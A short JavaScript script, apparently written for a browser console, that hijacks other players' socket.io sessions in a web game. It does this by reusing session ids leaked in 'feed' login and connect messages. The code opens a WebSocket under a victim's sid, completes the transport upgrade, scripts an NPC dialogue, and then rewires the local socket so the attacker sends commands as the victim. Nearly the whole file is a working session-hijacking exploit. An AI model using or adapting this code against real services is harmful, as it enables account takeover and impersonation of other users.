// socket.io hijacker when sid is given. Does it needs some conditions for it? I don't know.
// sid is given in "feed" message, in type "login", "connect". When hijacked I observed that original connection is closed and tries new sid, and I could use this sid.

var done = 0;

function sortArgs() {
    var args = Array.prototype.slice.call(arguments);
    return args;
}
socket.socket.on('feed', function(data) {
    if (data.type == 'login') f(data.id)
    if (data.type == 'connect') f(data.user)

    function f(sid) {
        if (done) return;
        var interacts = 0,
            _go = 0;
        var ws = new WebSocket('ws://' + location.host + '/socket.io/?EIO=3&transport=websocket&t=1&sid=' + encodeURI(sid));
        ws.onopen = function() {
            ws.send('2probe')
        }

        function send() {
            ws.send('42' + JSON.stringify(sortArgs.apply(null, arguments)));
        }
        ws.onmessage = function(event) {
            var data = event.data;
            var origData = data;
            for (var i = 0; i < data.length; i++)
                if ('0123456789'.indexOf(data[i]) == -1) break;
            data = data.substr(i)
            if (data[0] == '[') {
                data = JSON.parse(data)
                cmd = data.shift(0)
                if (cmd != 'feed' && _go) console.log(cmd, data[0], data)
            } else {
                cmd = ''
            }
            if (data == 'probe') {
                ws.send('5')
                ws.send('42["start"]')
            }
            if (cmd == 'overworld-init') { // kinda exciting..
                console.log(data[0])
                send('overworld-interact-entity', data[0].scene.entities[0].id)
            }
            if (cmd == 'overworld-interact-continue') {
                interacts++;
                if (interacts == 3) response = 3;
                else response = 0;
                if (interacts > 3) {
                    if (data[0].text.indexOf('Sure thing.') != -1) {
                        _go = 1;
                        send(['overworld-respond', 0])
                    } else {
                        ws.onmessage = null;
                        ws.close();
                    }
                }
                send('overworld-respond', response)
            }
            if (_go) {
                socket.socket.io.decoder.add(origData.substr(1))
                socket.socket.emit = send;
                done = 1;
            }
        }
    }
})